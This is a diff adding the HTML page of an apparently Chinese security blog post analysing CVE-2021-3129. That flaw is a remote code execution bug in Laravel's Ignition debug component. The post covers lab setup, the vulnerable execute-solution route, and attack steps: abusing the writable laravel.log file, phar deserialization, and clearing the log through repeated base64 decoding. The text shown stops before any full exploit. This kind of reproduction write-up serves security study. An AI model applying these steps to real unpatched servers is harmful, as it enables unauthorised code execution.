@@ -1,0 +1,1760 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>Laravel8 CVE-2021-3129 复现分析 - TARI TARI</title>
+  
+    <meta name="keywords" content="漏洞复现,ignition,Laravel8">
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            TARI TARI
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/img/home.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">TARI TARI</p>
+    
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        Laravel8 CVE-2021-3129 复现分析
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年6月3日 13:00</p>
+  </a>
+</div>
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-09T17:02:34+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年6月9日 17:02</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="Laravel8 CVE-2021-3129 复现分析" data-path="/2021/06/03/laravel8-debug-rce/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：6.1k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：28分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>由于参加两次CTF都遇上了<code>反序列化+PHP各种filter过滤器的利用</code>，然后对一些不常见<code>filter</code>的利用不是很熟悉，因此复现分析一下 <code>CVE-2021-3129</code>，因为这个CVE对一些<code>filter</code>利用的比较巧妙</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/facade/ignition">ignition组件</a>是Laravel5.5及其之后的使用的自定义错误页面美化组件，2.5.2 版本之前因 <code>file_get_contents()</code> 和 <code>file_put_contents()</code>两个函数不安全使用导致攻击者可以在Laravel框架（&lt;8.4.2）开启debug模式的情况下未授权RCE。</p>
+<p>影响范围<sup>[1-2]</sup></p>
+<ul>
+<li>ignition</li>
+</ul>
+<p>&gt;= 2.5.0, &lt; 2.5.2</p>
+<p>&gt;= 2.0.0, &lt; 2.4.2</p>
+<p>&gt;= 1.7.0, &lt; 1.16.14</p>
+<p>&lt; 1.6.15</p>
+<ul>
+<li>Laravel </li>
+</ul>
+<p>&lt; 8.4.2</p>
+<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><p>复现环境：PHP 7.3.24</p>
+<h3 id="2-1-安装-composer"><a href="#2-1-安装-composer" class="headerlink" title="2.1 安装 composer"></a>2.1 安装 composer</h3><p><a target="_blank" rel="noopener" href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span></span><br><span class="line">php -r <span class="string">&quot;if (hash_file(&#x27;sha384&#x27;, &#x27;composer-setup.php&#x27;) === &#x27;756890a4488ce9024fc62c56153228907f1545c228516cbf63f885e036d37e9a59d27d63f46af1d4d07ee0f76181c7d3&#x27;) &#123; echo &#x27;Installer verified&#x27;; &#125; else &#123; echo &#x27;Installer corrupt&#x27;; unlink(&#x27;composer-setup.php&#x27;); &#125; echo PHP_EOL;&quot;</span></span><br><span class="line">php composer-setup.php</span><br><span class="line">php -r <span class="string">&quot;unlink(&#x27;composer-setup.php&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">sudo mv composer.phar /usr/<span class="built_in">local</span>/bin/composer</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-2-安装-Laravel"><a href="#2-2-安装-Laravel" class="headerlink" title="2.2 安装 Laravel"></a>2.2 安装 Laravel</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/laravel/laravel.git</span><br><span class="line"><span class="built_in">cd</span> laravel</span><br><span class="line">git checkout -b e849812</span><br><span class="line">composer install</span><br><span class="line">composer require facade/ignition==2.5.1</span><br><span class="line">cp .env.example .env</span><br><span class="line">php artisan key:generate</span><br></pre></td></tr></table></figure>
+
+<p><code>.env.example</code> 默认配置是<code>debug</code>模式，可不予理会</p>
+<p>然后启动 Apache 环境即可，访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx&#x2F;public&#x2F;index.php</span><br></pre></td></tr></table></figure>
+
+<p>这里不用 <code>php artisan serve</code> 启动因为没有Apache集成环境debug方便</p>
+<p><img src="/img/laravel8-debug-rce/image-20210603153123337.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603153123337.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603153123337"></p>
+<h3 id="2-3-编写漏洞入口代码"><a href="#2-3-编写漏洞入口代码" class="headerlink" title="2.3 编写漏洞入口代码"></a>2.3 编写漏洞入口代码</h3><p>先在 <code>resources/views</code> 目录下新建一个文件 <code>hello.blade.php</code>，内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; Hello &#123;&#123; $username &#125;&#125; &lt;&#x2F;h1&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>routes/web.php</code> 增加路由</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/hello&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/laravel8-debug-rce/image-20210603153756640.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603153756640.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603153756640"></p>
+<p>访问这个视图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;laravel8.tari:8890&#x2F;public&#x2F;index.php&#x2F;hello</span><br></pre></td></tr></table></figure>
+
+<p>正常出现变量未定义报错信息</p>
+<p><img src="/img/laravel8-debug-rce/image-20210603153845580.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603153845580.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603153845580"></p>
+<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3. 漏洞分析"></a>3. 漏洞分析</h2><h3 id="3-1-触发点路由追踪"><a href="#3-1-触发点路由追踪" class="headerlink" title="3.1 触发点路由追踪"></a>3.1 触发点路由追踪</h3><p>点击 <code>Make variable optional</code> 并抓包，这个方法会自动把我们模板的 <code>&#123;&#123; $username &#125;&#125;</code> 替换为 <code>&#123;&#123; $username ?? '' &#125;&#125;</code>，即添加一个默认值</p>
+<p><img src="/img/laravel8-debug-rce/image-20210603155331535.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603155331535.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603155331535"></p>
+<p>可以看到，请求的路径为 <code>_ignition/execute-solution</code></p>
+<p><img src="/img/laravel8-debug-rce/image-20210603155451064.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603155451064.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603155451064"></p>
+<p>全局分别搜一下 <code>_ignition</code> 和 <code>execute-solution</code> 可知</p>
+<p>本API对应的方法为 <code>vendor/facade/ignition/src/IgnitionServiceProvider.php</code> 中的 <code>ExecuteSolutionController</code> 类</p>
+<p><img src="/img/laravel8-debug-rce/image-20210603213316826.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603213316826.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603213316826"></p>
+<p>跟进此类，下个断点发现<code>ExecuteSolutionController</code>类对象会被当做函数调用</p>
+<p><img src="/img/laravel8-debug-rce/image-20210603222122634.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210603222122634.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210603222122634"></p>
+<p>与其定义的 <code>__invoke</code> 魔术方法一致。</p>
+<p>在<code>__invoke</code> 魔术方法中先调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br></pre></td></tr></table></figure>
+
+<p>获取 <code>$solution</code> 对象随后调用 <code>$solution</code>对象的 <code>run</code>方法</p>
+<p>跟进得知 <code>$solution</code> 即为我们 POST 传入的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;solution&quot;:&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>$solution-&gt;run();</code></p>
+<p><img src="/img/laravel8-debug-rce/image-20210604140216816.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210604140216816.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210604140216816"></p>
+<p>逻辑可简化为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>$parameters</code> 为我们 POST 传入的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;/Users/tari/Sites/laravel/resources/views/hello.blade.php&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之所以可以简化为两行，是因为中间的逻辑主要为，在 <code>$this-&gt;makeOptional($parameters);</code>方法里把 <code>$parameters[&#39;variableName&#39;]</code>加上 <code>&quot;?? &#39;&#39;&quot;</code> ，之后为从词法分析层面，即 <code>$this-&gt;generateExpectedTokens()</code> 中，是否真的在变量 <code>$parameters[&#39;variableName&#39;]</code> 期望位置加上了 <code>&quot;?? &#39;&#39;&quot;</code></p>
+<p>，加上了的话就返回替换后的内容。所以只要我们传入的 <code>$parameters[&#39;variableName&#39;]</code> 变量在模板文件中真实存在，多为满足条件的。<strong>当然这是建立在我们只到变量名称的情况下，如果不知道呢？</strong></p>
+<p>换个角度理解，只要我们传入的变量是模板中不存在的，那么 <code>$newTokens</code> 恒为 <code>[0]</code>，<code>$expectedTokens</code> 也是恒为 <code>[0]</code>，那么 <code>$expectedTokens !== $newTokens</code> 恒成立，压根就不用管这部分逻辑。</p>
+<h3 id="3-2-漏洞点分析"><a href="#3-2-漏洞点分析" class="headerlink" title="3.2 漏洞点分析"></a>3.2 漏洞点分析</h3><p> <code>file_get_contents</code> 和 <code>file_put_contents</code> 读取和写入的文件是一样的，且文件输出内容几乎不可控，相当于读取一个文件，又写回去，就加上了 <code>&quot;?? &#39;&#39;&quot;</code> 。</p>
+<p>虽然 <code>$parameters[&#39;variableName&#39;]</code>  不太可控，但 <code>file_get_contents</code> 和 <code>file_put_contents</code> 的输入，即<code>$parameters[&#39;viewFile&#39;]</code> 是可控的。然后服务端上我们可控的文件只有日志文件，这里使用 Laravel 的日志文件，默认位置是 <code>storage/logs/laravel.log</code> ，是用来记录一些 ERROR 级别的报错日志。</p>
+<p><img src="/img/laravel8-debug-rce/image-20210604192821592.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210604192821592.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210604192821592"></p>
+<p>格式可分为 4 部分，时间、错误、错误描述、错误堆栈</p>
+<p>先尝试一下输入的内容是否能正常的写入日志文件中</p>
+<p><img src="/img/laravel8-debug-rce/image-20210606161844233.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606161844233.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606161844233"></p>
+<p><img src="/img/laravel8-debug-rce/image-20210606162114729.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210606162114729.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210606162114729"></p>
+<p>可以正常写入，也就是，日志文件大概如下结构，其中payload为我们可控部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>问题在于，如何在存在<code>[prefix]</code> <code>[midfix1]</code> <code>[midfix2]</code> <code>[suffix]</code> 的情况下，如何让可控<code>PAYLOAD</code>被利用？</p>
+<p>首先，考虑 <code>phar://</code>数据流包装器，因为 <code>file_get_contents</code> 会触发 phar 的反序列化，通过 viewFile 传入即可。但这里会遇到几个问题</p>
+<h3 id="3-3-尝试-base64-过滤器修改内容"><a href="#3-3-尝试-base64-过滤器修改内容" class="headerlink" title="3.3 尝试 base64 过滤器修改内容"></a>3.3 尝试 base64 过滤器修改内容</h3><p>PHP 中 <code>base64</code> 解码会过滤除特殊字符，如</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_decode(<span class="string">&#x27;[;#MQ==#...&lt;&lt;&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/laravel8-debug-rce/image-20210605104826605.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605104826605.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605104826605"></p>
+<p><code>&#39;1&#39;</code> 等价于 <code>base64_decode(&#39;MQ==&#39;)</code> 等价于 <code>base64_decode(&#39;[;#MQ==#...&lt;&lt;&gt;&#39;)</code></p>
+<p>然后PHP的<code>base64_decode</code>解码还有一个特性，在需要解码的字符串长度不足4的倍数时，会自动添加 <code>=</code> 号填充，也就是说，没有因输入的字符串不符合base64编码后的规则而抛出异常一说，直至把字符串解码为空串</p>
+<p><img src="/img/laravel8-debug-rce/image-20210605144342722.png" class="lazyload" data-srcset="/img/laravel8-debug-rce/image-20210605144342722.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210605144342722"></p>
+<p>但问题在于，这个值难以控制，如日志里的时间</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(base64_decode(base64_decode(<span class="string">&#x27;[2021-06-05 05:21:45]&#x27;</span>)));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;3&quot;</span></span><br><span class="line">php &gt; var_dump(base64_decode(base64_decode(<span class="string">&#x27;[2021-06-06 05:21:45]&#x27;</span>)));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>稍微把5变为6，结果则不尽相同。此外，后面还有调用栈等复杂的字符串，处理起来比较麻烦。</p>
+<p>不过PHP base64特性也不是一无是处，我们可以利用它清空<code>laravel.log</code>使我们受到的干扰进一步降低。经实验，258278字符的日志文件在经过 8次 <code>base64_decode</code>后即可变为空。即多请求几次这个接口即可清空日志文件。</p>
